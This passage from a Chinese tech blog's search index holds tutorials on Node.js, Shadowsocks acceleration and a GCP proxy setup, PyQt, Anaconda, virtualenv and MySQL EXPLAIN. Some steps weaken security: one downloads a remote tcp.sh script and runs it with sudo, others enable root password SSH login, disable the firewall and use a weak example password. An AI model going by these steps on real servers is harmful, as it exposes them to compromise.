BOM（一些操作浏览器的方法）\n\n上面是JavaScript的组成部分，那么Nodejs呢？\n\n#### 2.2 nodejs：\n\n- ECMAScript(语言基础，如：语法、数据类型结构以及一些内置对象)\n- os(操作系统)\n- file(文件系统)\n- net(网络系统)\n- database(数据库)\n\n分析：很容易看出，前端和后端的js相同点就是，他们的语言基础都是ECMAScript，只是他们所扩展的东西不同，前端需要操作页面元素，于是扩展了DOM，也需要操作浏览器，于是就扩展了BOM。而服务端的js则也是基于ECMAScript扩展出了服务端所需要的一些API，稍微了解后台的童鞋肯定知道，后台语音有操作系统的能力，于是扩展os，需要有操作文件的能力，于是扩展出file文件系统、需要操作网络，于是扩展出net网络系统，需要操作数据，于是要扩展出database的能力。\n\n这么一对比，相信很多小伙伴对nodejs更加了解了，原来前端和服务端的js如此相似，他们的基础是相同的，只是环境不同，导致他们扩展出来的东西不同而已。\n\n\n\n### 3. 总结:\n\n在ecmascript部分node和JS其实是一样的，比如与数据类型的定义、语法结构，内置对象。\n\n例如js中的顶层对象是window对象，但是在node中没有什么window对象，node中的顶层对象是global对象。","tags":["nodejs"],"categories":["nodejs"]},{"title":"shadowsocks加速的几种方案","url":"%2Fp%2F4241e56c.html","content":"\n\n\n由于国外VPS服务器与国内用户距离较远，连接线路错综复杂，在数据传输过程中的拥堵和丢包较为严重，从而造成连接速度极速下降，极大影响使用体验。通过加速工具对网络加速处理后，可以明显改善网络传输速度，提升用户体验。\n\n如果你正在使用Shadowsocks/V2ray等科学上网工具，那么经过加速后的网络，速度会有几十倍甚至上百倍的提升，在观看Youtube视频时效果尤其明显。\n\n\n\n### 1. VPS服务器可用的加速方案\n\n相比OpenVZ架构，KVM的全虚拟化技术，使其系统内核可以被随意更换。有了这一特性加持，KVM架构的服务器基本可以适配所有网络加速方案。\n\nKVM可用主流加速方案：\n\n- 原版BBR\n- 魔改BBR\n- 锐速\n- KCPTUN\n\n除特殊情况外，KVM可用的加速方案，XEN架构也能用。\n\n<!-- more -->\n\n**几种方案的加速效果排行:**\n\n+ 根据加速效果：KCPTUN > 魔改BBR ≥ 锐速 > 原版BBR > 无加速\n\n+ 根据安装便利程度：原版BBR > 魔改BBR > 锐速 ≥ KCPTUN\n\n\n\n便利程度这一项有必要详细介绍下：\n\n其实KCPTUN排最后有点委屈，它一不挑架构、二不挑系统，基本是个服务器就能装。之所以排名靠后，仅仅是因为它是唯一需要客户端的加速方案。\n\n锐速为什么排名也靠后？因为它太挑系统内核，对的内核几秒安装成功，不对的内核直接安装不上。\n\n\n\n一、KCPTUN\n\nKCPTUN的加速效果最为突出，在使用时，除了需要安装KCPTUN服务器端外，还需要在本地设备上安装KCPTUN客户端。\n\n优点：不挑架构，OpenVZ也能装；不挑系统版本；加速效果非常明显；可以避开TCP流量限速；可以与锐速/BBR同时安装（加速效果不叠加，因为KCPTUN是UDP流量）。\n\n缺点：需要在本地设备安装客户端；仅加速特定端口，不能对服务器上的网站进行加速。\n\n二、锐速\n\n锐速只需在服务器上安装，但是比较挑系统内核，根据站长的使用经验，推荐在Debian 8 /Debian 7 系统上安装锐速，成功率较高。\n\n优点：仅需在服务器端安装，无需客户端，TCP加速效果明显，可以对网站、Shadowsocks/SSR/V2ray流量进行加速。\n\n不足：不支持OpenVZ架构的系统安装；不支持部分系统内核安装。\n\n三、魔改BBR\n\n魔改BBR是原版BBR基础上的第三方激进版本，效果优于原版BBR。\n\n优点：由于是官方BBR基础上的激进版本，所以优点与原版BBR基本一致，加速效果更为明显。\n\n不足：不支持OpenVZ架构的系统，不支持部分系统版本安装。\n\n四、原版BBR\n\n原版BBR由Google出品，集成在Linux系统的最新内核中，低版本内核通过更换新内核的方式安装BBR。\n\n优点：官方新内核集成不占用系统资源，安装成功率高，TCP加速效果比较明显，可以对网站、Shadowsocks/SSR/V2ray流量进行加速。\n\n不足：不支持OpenVZ架构的系统，加速效果略逊于其它几款。\n\n\n\n也可以参考网络加速工具的测试:   https://www.ljchen.com/archives/1224\n\n\n\n### 2. 判断买的vps使用了什么虚拟技术\n\n\n\n```shell\nsudo apt install virt-what\n\nsudo virt-what  #我的GCP显示为 kvm\n```\n\n如果你的 VPS 使用的是 OpenVZ 的虚拟技术，你是不能使用 BBR 的. 只能安装KCPTUN加速\n\n所以买vps最好买KVM的.\n\n\n\n### 3. bbr, 魔改bbr, bbrplus, 锐速开启\n\n\n\n+ bbr加速原理: https://blog.sometimesnaive.org/article/8\n\n+ 开启bbr方法: [https://github.com/iMeiji/shadowsocks_install/wiki/%E5%BC%80%E5%90%AF-TCP-BBR-%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95](https://github.com/iMeiji/shadowsocks_install/wiki/开启-TCP-BBR-拥塞控制算法)\n\n\n\n我选用的是网上的一键安装脚本, 可以选择安装某个版本并开启 https://loukky.com/archives/479\n\n```shell\nwget \"https://github.com/cx9208/Linux-NetSpeed/raw/master/tcp.sh\" \nchmod +x tcp.sh \nsudo ./tcp.sh\n```\n\n\n\n![1](shadowsocks加速的几种方案/1.png)\n\n\n\n由于我安装的是BBRPlus, 此处输入2.  等安装完毕, 重启后再次运行这个脚本, 输入7\n\n\n\n在过程中出现下面的弹出框, 选no\n\n![1](shadowsocks加速的几种方案/2.png)\n\n\n\n最后通过 `lsmod` 看是否安装成功\n\n![1](shadowsocks加速的几种方案/3.png)\n\n\n\n打开youtube 测试, 发现1080P轻松无压力\n\n![1](shadowsocks加速的几种方案/4.png)\n\n\n\n### 4. KCPTUN 开启\n\n由于kcptun是用的udp, 而bbr是调整了tcp的发包策略, 两个的加速效果不能叠加\n\n并且kctun还需要在客户端上支持, 所以我就没有再折腾. 感兴趣的可以参考:\n\n<https://blog.kuoruan.com/110.html>","tags":["shadowsocks"],"categories":["科学上网"]},{"title":"谷歌云搭建免费服务器并翻墙","url":"%2Fp%2Fb7e5827a.html","content":"\n\n前两年折腾过[亚马逊的免费一年aws并搭建梯子](https://unix2dos.github.io/p/934b1a1.html), 后来发现速度很慢就弃用了. 俗话说免费的是最贵的. 但是google注册之后直接给300刀, 货真价实的钱可以用来买服务器, 简直不要太好用!\n\n> youtube观看1080p无压力\n\n![1](谷歌云搭建免费服务器并翻墙/3.png)\n\n### 1. 注册并申请GCP\n\nhttps://console.cloud.google.com,  在注册时填写个人资料的时候需要填写visa信用卡验证,可以用自己的visa卡(会扣除1美刀但是会返回, 个别银行visa卡不支持), 当然也可以去万能的某宝购买一个虚拟的信用卡, 价值在10元-30元左右.\n\n<!-- more -->\n\n### 2. 创建服务器实例\n\n在GCP控制中心的` Compute Engine` 的 VM 实例里, 点击创建实例. 这里我选用的是Ubuntu 16.04, 机器类型共享vCPU翻墙足矣.\n\n\n![1](谷歌云搭建免费服务器并翻墙/1.png)\n\n\n\n创建成功后,  可以通过网页上的ssh连接进去.\n\n\n\n\n\n### 3. 安全组放开, 固定IP\n\n点击VM实例 -> 内部IP -> 下面的链接 进入VPC网络管理\n\n![1](谷歌云搭建免费服务器并翻墙/2.png)\n\n\n\n\n\n只在vps内关闭防火墙是无效的, 还需要在consle设置防火墙规则. 在`防火墙规则`里创建防火墙规则, 增加要放行的端口(例如接下来要设置的shadowsocks的端口)\n\n另外最好固定下外部ip地址, 否则重启后ip变了, 会非常的麻烦. 在`外部IP地址`里, 增加固定IP即可. \n\n\n\n### 4. 设置第三方ssh登录\n\n\n\n通过网页的ssh操作很麻烦, 我们希望直接通过终端直接连接服务器.\n\n\n\n准备工作:\n\n```shell\nsudo passwd root #给root设置个密码\n\nsudo ufw disable #禁止防火墙, 然并卵, 还需要去控制中心增加防火墙规则\n\n```\n\n\n\n修改sshd_config:\n\n```shell\nsudo vi /etc/ssh/sshd_config # 修改sshd_config, 允许密码登录\n\nPermitRootLogin yes\t\t\t\t\t# 允许root登录\nPasswordAuthentication yes  # 允许密码登录框\n\nsudo systemctl restart sshd # 最后重启sshd\n```\n\n\n\n最好避免用root直接登录,  可以切到`root`给自己搞个密码然后再把自己加入到sudoer里面.\n\n然后我们就可以通过终端直接连接到服务器了, 但是发现连接比较卡, 这时候我们需要安装下`mosh`优化ssh的连接\n\n\n\n### 4. 安装mosh并开机启动\n\n\n\n安装mosh:\n\n```shell\nsudo apt install mosh\n\n# 安装后直接把ssh换成mosh, 连接后会发现速度快很多.(需要增加防火墙规则允许mosh的端口)\n```\n\n\n\n编写`mosh-server` service文件:\n\n```shell\nsudo vi /etc/systemd/system/mosh-server.service\n\n\n[Unit]\n\nDescription=Mosh server\n\nAfter=network.target\n\n\n\n[Service]\n\nEnvironment=\"LC_ALL=en_US.UTF8\"\n\nExecStart=/usr/bin/mosh-server\n\nType=forking\n\n\n\n[Install]\n\nWantedBy=default.target\n\n```\n\n\n\n启动并设置开机启动:\n\n```shell\nsudo systemctl daemon-reload\n\nsudo systemctl enable mosh-server\n\nsudo systemctl start mosh-server\n```\n\n\n\n客户端直接用mosh连接就可以了, 如果报错 `LC_CTYPE=UTF-8` 的问题需要在两台电脑上加上环境变量(.zshrc|.bashrc)\n\n```shell\nexport LC_ALL=en_US.UTF-8 \nexport LANG=en_US.UTF-8 \nexport LANGUAGE=en_US.UTF-8\n```\n\n\n\n### 5. 安装shadowsocks并开机启动\n\n\n\n安装shadowsocks:\n\n```shell\nsudo apt update\n\nsudo apt install python-pip\n\nwget https://bootstrap.pypa.io/get-pip.py\n\nsudo python get-pip.py\n\nsudo pip install shadowsocks\n```\n\n\n\n编写配置文件:\n\n```shell\nsudo mkdir /etc/shadowsocks/\nsudo vi /etc/shadowsocks/ss-config.json\n\n{\n  \"server\": \"0.0.0.0\",\n  \"server_port\": 6789, # 服务端端口\n  \"local_address\": \"127.0.0.1\",\n  \"local_port\": 1080,\n  \"password\": \"iampasswd\",# 密码\n  \"timeout\": 300,\n  \"method\": \"aes-256-cfb\",#加密方式\n  \"fast_open\": false\n}\n```\n\n\n\n编写`shadowsocks-server` service文件:\n\n```shell\nsudo vi /etc/systemd/system/shadowsocks-server.service\n\n[Unit]\nDescription=Shadowsocks Server\nAfter=network.target\n\n[Service]\nExecStart=/usr/local/bin/ssserver -c /etc/shadowsocks/ss-config.json\nRestart=on-abort\n\n[Install]\nWantedBy=multi-user.target\n```\n\n\n\n启动并设置开机启动:\n\n```shell\nsudo systemctl daemon-reload\nsudo systemctl enable shadowsocks-server\nsudo systemctl start shadowsocks-server\n```\n\n\n\n接下来就下载小飞机连接即可, [下一篇将写如何为shadowsocks加速.](https://unix2dos.github.io/p/4241e56c.html)\n","tags":["shadowsocks"],"categories":["科学上网"]},{"title":"pyqt安装使用打包教程","url":"%2Fp%2Fa0594c46.html","content":"\n\n\n最近准备开发一个GUI程序, 考察了一些能选用的技术,  在windows下有多门语言可以选择(包括易语言哈哈). \n\n但是最初的想法是不仅要快捷开发而且最好跨平台, 跨平台基本没得选了只能用qt了, 但短时间内用c++开发还是没有勇气的, 于是举棋不定选python.\n\n\n\n### 1. 下载 qt designer\n\n因为 Qt Creator实在太大了, 选用Qt Designer.下载链接: https://build-system.fman.io/qt-designer-download\n\n安装成功后, 最好设置`Appearance`里为 `Dockerd Window`, 要不然很别扭\n\n<!-- more -->\n\n![1](pyqt安装使用打包教程/1.png)\n\n\n\n### 2. 下载安装pyqt\n\n```shell\nconda create --name pygui python=3.7   # 强烈建议使用conda, 创建一个新的虚拟环境\nconda activate pygui  # 启用虚拟环境\n\n\nconda install pip  # 安装pip\npip install PyQt5\npip install fbs            \npip install PyInstaller\n```\n\n\n\n### 3. pycharm配置QtDesigner和PyUIC\n\n+ 配置conda\n\n  pycharm 设置 `Project Interpreter` 为 pygui下的python\n\n  ![1](pyqt安装使用打包教程/4.png)\n\n\n\n+ 配置Qt Designer\n\n  Program:  你的Qt Designer的路径\n\n  ![1](pyqt安装使用打包教程/2.png)\n\n\n+ 配置PyUIC\n\n  Program:   你的pyuic5路径\n  Arguments:  `$FileName$ -o $FileNameWithoutExtension$.py`\n  Working directory:  `$FileDir$`\n\n  ![1](pyqt安装使用打包教程/3.png)\n\n\n\n\n### 4. 使用pyqt\n\n+ pyqt教程\n  http://zetcode.com/gui/pyqt5/    \n\n  **应该花至少一个下午的时间先撸一遍这个教程**\n\n\n\n+ qt designer教程\n\n  https://doc-snapshots.qt.io/qt5-5.9/qtdesigner-manual.html\n\n  **应该花至少一个上午的时间先撸一遍这个教程**\n\n  \n\n\n  使用qt designer 设计程序后, 保存为.ui文件.  然后用pycharm的 External tools -> PyUIC 生成 py文件\n\n  在生成的py下面加入这些话, 可以运行\n\n  ```python\n  if __name__ == '__main__':\n      import sys\n      app = QtWidgets.QApplication(sys.argv)\n      MainWindow = QtWidgets.QMainWindow()\n      ui = Ui_MainWindow()\n      ui.setupUi(MainWindow)\n      MainWindow.show()\n      sys.exit(app.exec_())\n  ```\n\n\n\n### 5. 打包安装程序\n\n请参考: \n\n+ https://github.com/mherrmann/fbs\n+ https://github.com/mherrmann/fbs-tutorial\n\n\n\n### 6. pyqt5教程\n\n+ http://zetcode.com/gui/pyqt5/\n\n+ https://zhuanlan.zhihu.com/p/48373518","tags":["pyqt"],"categories":["python"]},{"title":"python包管理器anaconda介绍安装和使用","url":"%2Fp%2F3c2948a5.html","content":"\n\n\n在Python中，安装第三方模块，是通过包管理工具pip完成的。用pip一个一个安装费时费力，还需要考虑兼容性。我们推荐直接使用[anaconda](https://www.anaconda.com/)，这是一个基于Python的数据处理和科学计算平台，它已经内置了许多非常有用的第三方库，我们装上Anaconda，就相当于把数十个第三方模块自动安装好了，非常简单易用。\n\n\n\nanaconda 是一个用于科学计算的Python发行版，支持 Linux, Mac, Windows系统，提供了包管理与环境管理的功能，可以很方便地解决多版本python并存、切换以及各种第三方包安装问题。anaconda 利用工具/命令 conda 来进行 package 和 environment 的管理，并且已经包含了Python和相关的配套工具。\n\n\n\n这里先解释下conda、anaconda这些概念的差别，详细差别见下节。\n\n1. ##### anaconda\n\nanaconda 则是一个打包的集合，里面预装好了 conda、某个版本的python、众多packages、科学计算工具等等，所以也称为Python的一种发行版。其实还有Miniconda，顾名思义，它只包含最基本的内容——python与conda，以及相关的必须依赖项，对于空间要求严格的用户，Miniconda是一种选择。\n\n<!-- more -->\n\n2. ##### conda\n\nconda 可以理解为一个工具，也是一个可执行命令，其核心功能是`包管理`与`环境管理`。 包管理与pip的使用类似，环境管理则允许用户方便地安装不同版本的python并可以快速切换。\n\n\n\n进入下文之前，说明一下conda的设计理念——**conda将几乎所有的工具、第三方包都当做package对待，甚至包括python和conda自身**！因此，conda打破了包管理与环境管理的约束，能非常方便地安装各种版本python、各种package并方便地切换。\n\n\n\n\n\n### 1. anaconda、conda、pip、virtualenv的区别\n\n**1. anaconda**\n\nanaconda是一个包含180+的科学包及其依赖项的发行版本。其包含的科学包包括：conda, numpy, scipy, ipython notebook等。\n\n**2. conda**\n\nconda是包及其依赖项和环境的管理工具。\n\n+ 适用语言：Python, R, Ruby, Lua, Scala, Java, JavaScript, C/C++, FORTRAN。\n+ 适用平台：Windows, macOS, Linux\n+ 用途：快速安装、运行和升级包及其依赖项；在计算机中便捷地创建、保存、加载和切换环境。\n\n如果你需要的包要求不同版本的Python，你无需切换到不同的环境，因为conda同样是一个环境管理器。仅需要几条命令，你可以创建一个完全独立的环境来运行不同的Python版本，同时继续在你常规的环境中使用你常用的Python版本。\n\n+ conda为Python项目而创造，但可适用于上述的多种语言。\n+ conda包和环境管理器包含于anaconda的所有版本当中。\n\n**3. pip**\n\n+ pip是用于安装和管理软件包的包管理器。\n+ pip编写语言：Python。\n+ Python中默认安装的版本：\n\nPython 2.7.9及后续版本：默认安装，命令为pip\nPython 3.4及后续版本：默认安装，命令为pip3\n\n\n\n**4. virtualenv**\n\n用于创建一个独立的Python环境的工具。解决问题：\n1. 当一个程序需要使用Python 2.7版本，而另一个程序需要使用Python 3.6版本，如何同时使用这两个程序？\n2. 如果将所有程序都安装在系统下的默认路径，如：/usr/lib/python2.7/site-packages，当不小心升级了本不该升级的程序时，将会对其他的程序造成影响。\n3. 如果想要安装程序并在程序运行时对其库或库的版本进行修改，都会导致程序的中断。\n4. 在共享主机时，无法在全局site-packages目录中安装包。\n\nvirtualenv将会为它自己的安装目录创建一个环境，这并不与其他virtualenv环境共享库；同时也可以选择性地不连接已安装的全局库。\n\n\n\n### 2. pip 与 conda 比较\n\n1. 依赖项检查\n\n   pip：1. 不一定会展示所需其他依赖包。2. 安装包时或许会直接忽略依赖项而安装，仅在结果中提示错误。\n\n   conda：1. 列出所需其他依赖包。2. 安装包时自动安装其依赖项。3. 可以便捷地在包的不同版本中自由切换。\n\n   \n\n2. 环境管理\n\n   pip：维护多个环境难度较大。\n   conda：比较方便地在不同环境之间进行切换，环境管理较为简单。\n\n  \n\n3. 对系统自带Python的影响\n\n   pip：在系统自带的Python包中 更新/回退版本/卸载 将影响其他程序。\n   conda：不会影响系统自带Python。\n\n  \n\n4. 适用语言\n\n   pip：仅适用于Python。\n   conda：适用于Python, R, Ruby, Lua, Scala, Java, JavaScript, C/C++, FORTRAN。\n\n\n\n### 3. conda与pip、virtualenv的关系\n\nconda结合了pip和virtualenv的功能。\n\n\n\n### 4. anaconda的安装和使用\n\n\n\n**1. 下载安装anaconda**  \n\n下载链接: https://www.anaconda.com/distribution/#download-section\n\n傻瓜安装后, anaconda会把系统Path中的python指向自己自带的Python，并且Anaconda安装的第三方模块会安装在Anaconda自己的路径下，不影响系统已安装的Python目录。\n\n```shell\nwhich python3\n/Users/liuwei/anaconda3/bin/python3\n```\n\n安装成功后在应用程序里打开 `Anaconda Navigator`，会展示出已经安装好的其他常用应用，如：\n\n![1](python包管理器anaconda介绍安装和使用/1.png)\n\n+ Anaconda Navigtor ：用于管理工具包和环境的图形用户界面，后续涉及的众多管理命令也可以在 Navigator 中手工实现。\n\n+ Jupyter notebook ：基于web的交互式计算环境，可以编辑易于人们阅读的文档，用于展示数据分析的过程。\n\n+ qtconsole ：一个可执行 IPython 的仿终端图形界面程序，相比 Python Shell 界面，qtconsole 可以直接显示代码生成的图形，实现多行代码输入执行，以及内置许多有用的功能和函数。\n\n+ spyder ：一个使用Python语言、跨平台的、科学运算集成开发环境。\n\n\n\n**2. 安装后在终端输入conda 无法识别这个命令:**\n\n```shell\nexport PATH=\"${HOME}/anaconda3/bin:$PATH\"\n```\n\n\n\n**3. 修改conda镜像源:**\n\n如不修改conda的镜像源，99.99%会报http链接失败的错误（网友踩坑经验）。\n\n输入以下两条命令来添加清华源：\n\n```shell\nconda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ \nconda config --set show_channel_urls yes\n```\n\n在家目录下会生成`.condarc`文件, 然后把ssl_verfiy改为false,\n\n```\nssl_verify: true\nchannels:\n  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/\n  - defaults\nshow_channel_urls: true\n```\n\n\n\n然后用 conda info 查看当前配置信息，channel URLs 字段内容变为清华即修改成功。\n\n\n\n### 5. anaconda python环境的创建和切换\n\n+ 可以在`anaconda-navigator`创建新的环境\n\n  ![1](python包管理器anaconda介绍安装和使用/2.png)\n\n\n\n 也可以命令行创建:\n\n```shell\nconda create -n py27 python=2.7 或 conda create --name py27 python=2.7\n```\n\n\n\n+ 使用如下命令，查看当前有哪些环境：\n\n```shell\nconda info -e\n\nWARNING: The conda.compat module is deprecated and will be removed in a future release.\n\n# conda environments:\n#\nbase                  *  /Users/liuwei/anaconda3\npy27                     /Users/liuwei/anaconda3/envs/py27\n```\n\n星号表示当前激活的环境。\n\n\n\n+ 激活py27环境：\n\n```shell\nsource activate py27 \n或 \nconda activate py27\n```\n\n\n\n这时候看python, 已经链接到py27了\n\n```shell\nwhich python\n\n/Users/liuwei/anaconda3/envs/py27/bin/python\n```\n\n\n\n+ 退出当前环境\n\n```shell\nconda deactivate \n或 \nsource deactivate\n```\n\n\n\n+ 查看安装了哪些包\n\n```shell\nconda list\n```\n\n 以后可以通过`anaconda-navigator`在指定环境下安装包\n\n![1](python包管理器anaconda介绍安装和使用/4.png)\n\n\n\n### 6. 配置pycharm使用anaconda环境\n\n在`Project Interpreter` 增加 virtualenvs的特定环境下的执行程序\n\n![1](python包管理器anaconda介绍安装和使用/3.png)\n\n\n\n\n\n### 7. 常用命令总结\n\n```bash\nconda info -e  # 查看有哪些环境\nconda create --name py27 python=2.7 # 创建一个环境\nconda env remove --name py37 # 删除一个环境\nconda activate py27 # 激活某个环境\nconda deactivate  #退出当前环境\nconda list # 查看安装了哪些包\n\n# conda 里集成 pip, 以防 conda 没有的包, 通过 pip 来安装\nconda install pip\n\nwhich pip\n/Users/liuwei/anaconda3/bin/pip\n\npip install xxx\n```\n\n","tags":["virtualenv"],"categories":["python"]},{"title":"python隔离环境virtualenv和virtualenvwrapper的使用","url":"%2Fp%2F8731aeb9.html","content":"\n\n\n如果我们要同时开发多个应用程序，那这些应用程序都会共用一个Python，就是安装在系统的Python 3。如果应用A需要jinja 2.7，而应用B需要jinja 2.6怎么办？\n\n这种情况下，每个应用可能需要各自拥有一套“独立”的Python运行环境。virtualenv就是用来为一个应用创建一套“隔离”的Python运行环境。\n\n\n\n### 1. 安装使用virtualenv(推荐使用virtualenvwrapper)\n\n首先，我们用pip安装virtualenv：\n\n```shell\nsudo pip3 install virtualenv\n```\n\n然后，假定我们要开发一个新的项目，需要一套独立的Python运行环境，可以这么做：\n\n\n\n<!-- more -->\n\n+ 第一步，创建目录：\n\n```shell\nmkdir myproject\ncd myproject/\n```\n\n\n\n+ 第二步，创建一个独立的Python运行环境，命名为venv：\n\n```shell\nvirtualenv --no-site-packages venv\n\nvirtualenv -p /Library/Frameworks/Python.framework/Versions/3.7/bin/python3 --no-site-packages venv  # 指定特定的版本创建隔离环境\n```\n\n\n\n命令virtualenv就可以创建一个独立的Python运行环境，我们还加上了参数--no-site-packages，这样，已经安装到系统Python环境中的所有第三方包都不会复制过来，这样，我们就得到了一个不带任何第三方包的“干净”的Python运行环境。\n\n\n\n+ 第三步, 新建的Python环境被放到当前目录下的venv目录。有了venv这个Python环境，可以用source进入该环境：\n\n```shell\nsource venv/bin/activate\n或\n. venv/bin/activate\n```\n\n注意到命令提示符变了，有个(venv)前缀，表示当前环境是一个名为venv的Python环境。 \n\n（mac iterm2+zsh下会出现蟒蛇哦, 即python的logo）\n\n\n\n在venv环境下，用pip安装的包都被安装到venv这个环境下，系统Python环境不受任何影响。也就是说，venv环境是专门针对myproject这个应用创建的。\n\n\n\n+ 第四步, 退出当前的venv环境，使用deactivate命令：\n\n```shell\ndeactivate\n```\n\n此时就回到了正常的环境，现在pip或python均是在系统Python环境下执行。\n\n完全可以针对每个应用创建独立的Python运行环境，这样就可以对每个应用的Python环境进行隔离。\n\n\n\nvirtualenv是如何创建“独立”的Python运行环境的呢？原理很简单，就是把系统Python复制一份到virtualenv的环境，用命令`source venv/bin/activate`进入一个virtualenv环境时，virtualenv会修改相关环境变量，让命令python和pip均指向当前的virtualenv环境。\n\nvirtualenv为应用提供了隔离的Python运行环境，解决了不同应用间多版本的冲突问题。\n\n\n\n\n\n### 2. 安装virtualenvwrapper\n\nvirtualenv需要每次使用source命令导入虚拟机运行环境，这一点非常麻烦，另外开发者还有可能忘记虚拟环境目录的建立位置，virtualenvwrapper这一命令行工具就是通过对virtualenv进行封装，解决了上述问题\n\n\n\n首先是安装:\n\n```shell\nsudo pip3 isntall virtualenvwrapper\n```\n\n\n\n安装后查找virtualenvwrapper.sh:\n\n```shell\nwhich virtualenvwrapper.sh \n\n/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh\n```\n\n\n\n然后修改环境变量配置 `.zshrc`:\n\n```shell\nexport WORKON_HOME=$HOME/virtualenvs \n\nexport VIRTUALENVWRAPPER_SCRIPT=/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh \n\nexport VIRTUALENVWRAPPER_PYTHON=/Library/Frameworks/Python.framework/Versions/3.7/bin/python3 \n\nexport VIRTUALENVWRAPPER_VIRTUALENV=/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenv \n\nexport VIRTUALENVWRAPPER_VIRTUALENV_ARGS='--no-site-packages' \n\nsource /Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh \n```\n\n\n\n中间的4行和你本机的python版本和路径要保持一致，此处注意如果不加上面中间4行，则会出现下面的错误：\n\n```shell\n/usr/bin/python: No module named virtualenvwrapper\n```\n\n至此大功告成，可以方便的使用virtualenvwrapper了。\n\n\n\n\n\n### 3. 使用virtualenvwrapper\n\n\n\n创建虚拟环境:\n\n```shell\nmkvirtualenv newenv  \n```\n\n\n\n这样就建立了一个虚拟的运行环境，而且一开始就处于激活状态，但看不到newenv目录，其实virtualenvwrapper对虚拟机环境作了统一的管理，根据上面配置的环境变量WORK_HOME的路径信息，在其中建立了虚拟运行环境目录.\n\n\n\n其他有用的命令:\n\n- workon: 打印所有的虚拟环境；\n- mkvirtualenv xxx: 创建 xxx 虚拟环境;\n- workon xxx: 使用 xxx 虚拟环境;\n- deactivate: 退出 xxx 虚拟环境；\n- rmvirtualenv xxx: 删除 xxx 虚拟环境。\n\n\n\n\n\n### 4. 配置pycharm使用隔离环境\n\n在`Project Interpreter` 增加 virtualenvs的特定环境下的执行程序\n\n![1](python隔离环境virtualenv和virtualenvwrapper的使用/1.png)","tags":["virtualenv"],"categories":["python"]},{"title":"mysql用explain分析查询语句","url":"%2Fp%2F8a4c23bd.html","content":"\nmysql 使用 `explain + sql 语句` 来查看执行计划，执行结果有以下字段，具体描述如下：\n\n<!-- more -->\n\n\n# 1. 字段说明\n\n| 字段          | 描述                                                         |\n| :------------ | :----------------------------------------------------------- |\n| id            | id相同，执行顺序由上至下；id不同，id的序号会递增，id值越大优先级越高，越先被执行 |\n| select_type   | 主要是用于区别普通查询、联合查询、子查询等的复杂查询         |\n| table         | 当前执行的表                                                 |\n| type          | 访问类型                                                     |\n| possible_keys | 可能使用的索引                                               |\n| key           | 实际使用的索引                                               |\n| key_len       | 使用的索引的长度                                             |\n| ref           | 显示索引的哪一列被使用了                                     |\n| rows          | 查询过程中可能扫描的行数, 原则上 rows 越少越好.              |\n| Extra         | 解析查询的额外信息，通常会显示是否使用了索引，是否需要排序，是否会用到临时表等 |\n| partitions    | 匹配的分区                                                   |\n| filtered      | 这个字段表示存储引擎返回的数据在server层过滤后，剩下多少满足查询的记录数量的比例，注意是百分比，不是具体记录数。 |\n\n### 1.1 select_type\n\n- SIMPLE, 表示此查询不包含 UNION 查询或子查询\n\n- PRIMARY, 表示此查询是最外层的查询\n\n- UNION, 表示此查询是 UNION 的第二或随后的查询\n\n- DEPENDENT UNION, UNION 中的第二个或后面的查询语句, 取决于外面的查询\n\n- UNION RESULT, UNION 的结果\n\n- SUBQUERY, 子查询中的第一个 SELECT\n\n- DEPENDENT SUBQUERY: 子查询中的第一个 SELECT, 取决于外面的查询. 即子查询依赖于外层查询的结果.\n\n\n\n\n### 1.2 type\n\n`type` 字段比较重要, 它提供了判断查询是否高效的重要依据依据. 通过 `type` 字段, 我们判断此次查询是 `全表扫描` 还是 `索引扫描` 等\n\n从上到下性能从低到高排列:\n\n+ all\n\n  表示全表扫描, 这个类型的查询是性能最差的查询之一. 通常来说, 我们的查询不应该出现 ALL 类型的查询, 因为这样的查询在数据量大的情况下, 对数据库的性能是巨大的灾难. 如一个查询是 ALL 类型查询, 那么一般来说可以对相应的字段添加索引来避免.\n\n+ index\n\n  表示全索引扫描(full index scan), 和 ALL 类型类似, 只不过 ALL 类型是全表扫描, 而 index 类型则仅仅扫描所有的索引, 而不扫描数据.\n\n  `index` 类型通常出现在: 所要查询的数据直接在索引树中就可以获取到, 而不需要扫描数据. 当是这种情况时, Extra 字段 会显示 `Using index`.\n\n  ```sql\n  EXPLAIN SELECT name FROM  user_info \\G\n  ```\n\n+ range\n\n  表示使用索引范围查询, 通过索引字段范围获取表中部分数据记录. 这个类型通常出现在 =, <>, >, >=, <, <=, IS NULL, <=>, BETWEEN, IN() 操作中.\n  当 `type` 是 `range` 时, 那么 EXPLAIN 输出的 `ref` 字段为 NULL, 并且 `key_len` 字段是此次查询中使用到的索引的最长的那个.\n\n+ index_merge\n\n+ ref\n\n  此类型通常出现在多表的 join 查询, 针对于非唯一或非主键索引, 或者是使用了 `最左前缀` 规则索引的查询.\n\n  ```sql\n  EXPLAIN SELECT * FROM user_info, order_info WHERE user_info.id = order_info.user_id AND order_info.user_id = 5\\G\n  ```\n\n+ eq_ref\n\n  此类型通常出现在多表的 join 查询, 表示对于前表的每一个结果, 都只能匹配到后表的一行结果. 并且查询的比较操作通常是 `=`, 查询效率较高. 例如:\n\n  ```sql\n  EXPLAIN SELECT * FROM user_info, order_info WHERE user_info.id = order_info.user_id\\G\n  ```\n\n+ const \n\n  针对主键或唯一索引的等值查询扫描, 最多只返回一行数据. const 查询速度非常快, 因为它仅仅读取一次即可.\n\n  例如下面的这个查询, 它使用了主键索引, 因此 `type` 就是 `const` 类型的.\n\n  ```sql\n  explain select * from user_info where id = 2\\G\n  ```\n\n+ system\n\n  表中只有一条数据. 这个类型是特殊的 `const` 类型.\n\n`ALL` 类型因为是全表扫描, 因此在相同的查询条件下, 它是速度最慢的.\n而 `index` 类型的查询虽然不是全表扫描, 但是它扫描了所有的索引, 因此比 ALL 类型的稍快.\n后面的几种类型都是利用了索引来查询数据, 因此可以过滤部分或大部分数据, 因此查询效率就比较高了.\n\n\n\n### 1.3 key_len\n\n表示查询优化器使用了索引的字节数. 这个字段可以评估组合索引是否完全被使用, 或只有最左部分字段被使用到.\nkey_len 的计算规则如下:\n\n- 字符串\n  - char(n): n 字节长度\n  - varchar(n): 如果是 utf8 编码, 则是 3 *n + 2字节; 